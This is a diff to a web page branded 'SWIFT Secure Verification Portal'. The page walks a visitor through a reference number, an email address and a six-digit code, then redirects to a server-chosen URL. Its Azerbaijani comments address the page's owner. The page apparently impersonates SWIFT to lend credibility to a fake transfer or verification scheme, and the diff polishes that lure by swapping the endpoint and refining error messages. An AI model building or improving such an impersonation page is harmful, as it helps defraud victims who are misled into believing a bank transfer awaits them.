@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>SWIFT Secure Verification Portal</title>
     <style>
-        /* Sənin orijinal dizayn kodların olduğu kimi qalır */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
         body {
             background: linear-gradient(rgba(0, 107, 60, 0.04), rgba(0, 107, 60, 0.04)),
@@ -26,7 +25,7 @@
         .step.active { display: block; }
         .input-group { margin-bottom: 20px; }
         .input-group label { display: block; color: #333; font-weight: 500; margin-bottom: 8px; font-size: 14px; }
-        input { width: 100%; padding: 14px 16px; border: 2px solid #e1e5e9; border-radius: 12px; font-size: 15px; }
+        input { width: 100%; padding: 14px 16px; border: 2px solid #e1e5e9; border-radius: 12px; font-size: 15px; transition: 0.3s; }
         input:focus { outline: none; border-color: #006b3c; box-shadow: 0 0 0 3px rgba(0, 107, 60, 0.1); }
         .btn {
             width: 100%; padding: 14px; background: linear-gradient(135deg, #006b3c 0%, #005a32 100%);
@@ -72,7 +71,7 @@
             <input type="text" id="referenceNumber" placeholder="Enter Reference Number" autocomplete="off">
         </div>
         <button class="btn" id="step1Next">Continue</button>
-        <div class="error" id="refError"></div>
+        <div class="error" id="refError">Invalid reference number.</div>
     </div>
 
     <!-- Step 2: Email -->
@@ -83,17 +82,17 @@
         </div>
         <button class="btn" id="sendCode">Send Verification Code</button>
         <div class="loading" id="emailLoading"><div class="loading-spinner"></div>Processing secure request...</div>
-        <div class="error" id="emailError"></div>
+        <div class="error" id="emailError">Failed to send code. Please check your email.</div>
     </div>
 
-    <!-- Step 3: Security Code -->
+    <!-- Step 3: Code -->
     <div class="step" id="step3">
         <div class="input-group">
             <label>Security Code</label>
             <input type="text" id="codeInput" placeholder="6-digit code" maxlength="6" style="text-align:center; letter-spacing: 4px;">
         </div>
         <button class="btn" id="verifyCode">Verify Identity</button>
-        <div class="error" id="codeError"></div>
+        <div class="error" id="codeError">Incorrect security code.</div>
     </div>
 
     <!-- Step 4: Success -->
@@ -114,10 +113,12 @@
 
 <script>
 (function() {
+    // Sənin işlək API ünvanın
+    const API_PATH = '/.functions/send-email';
+    
     let currentRef = '';
     let userEmail = '';
 
-    // Step navigation
     function showStep(step) {
         document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
         document.getElementById('step' + step).classList.add('active');
@@ -126,14 +127,18 @@
         });
     }
 
-    // Step 1: Reference Verification
+    // STEP 1: Check Reference
     document.getElementById('step1Next').onclick = async () => {
-        const ref = document.getElementById('referenceNumber').value.trim();
+        const refInput = document.getElementById('referenceNumber');
+        const ref = refInput.value.trim();
         const err = document.getElementById('refError');
         
+        if(!ref) return;
+
         try {
-            const res = await fetch('/.netlify/functions/verify', {
+            const res = await fetch(API_PATH, {
                 method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ action: "checkRef", ref: ref })
             });
             const data = await res.json();
@@ -143,24 +148,23 @@
                 err.style.display = 'none';
                 showStep(2);
             } else {
-                err.textContent = 'Invalid reference number.';
                 err.style.display = 'block';
             }
         } catch (e) {
-            err.textContent = 'Connection error.';
-            err.style.display = 'block';
+            console.error(e);
+            alert("Connection error to security service.");
         }
     };
 
-    // Step 2: Request Code
+    // STEP 2: Send Code
     document.getElementById('sendCode').onclick = async () => {
-        userEmail = document.getElementById('email').value.trim();
+        const emailInput = document.getElementById('email');
+        userEmail = emailInput.value.trim();
         const err = document.getElementById('emailError');
         const load = document.getElementById('emailLoading');
 
         if (!userEmail.includes('@')) {
-            err.textContent = 'Valid email required.';
-            err.style.display = 'block';
+            alert("Please enter a valid email address.");
             return;
         }
 
@@ -168,8 +172,9 @@
         load.style.display = 'block';
 
         try {
-            const res = await fetch('/.netlify/functions/verify', {
+            const res = await fetch(API_PATH, {
                 method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ action: "sendEmail", email: userEmail, ref: currentRef })
             });
             const data = await res.json();
@@ -177,28 +182,29 @@
             if (data.success) {
                 showStep(3);
             } else {
-                throw new Error();
+                err.style.display = 'block';
             }
         } catch (e) {
-            err.textContent = 'Security service unreachable.';
             err.style.display = 'block';
         } finally {
             load.style.display = 'none';
         }
     };
 
-    // Step 3: Validate and Redirect
+    // STEP 3: Verify and Redirect
     document.getElementById('verifyCode').onclick = async () => {
         const code = document.getElementById('codeInput').value.trim();
         const err = document.getElementById('codeError');
 
+        if(code.length < 6) return;
+
         try {
-            const res = await fetch('/.netlify/functions/verify', {
+            const res = await fetch(API_PATH, {
                 method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
                     action: "verifyFinal", 
                     email: userEmail, 
-                    ref: currentRef, 
                     code: code 
                 })
             });
@@ -210,12 +216,10 @@
                     window.location.href = data.redirect;
                 }, 2000);
             } else {
-                err.textContent = 'Incorrect security code.';
                 err.style.display = 'block';
             }
         } catch (e) {
-            err.textContent = 'Validation failed.';
-            err.style.display = 'block';
+            alert("Verification failed. Please try again.");
         }
     };
 })();
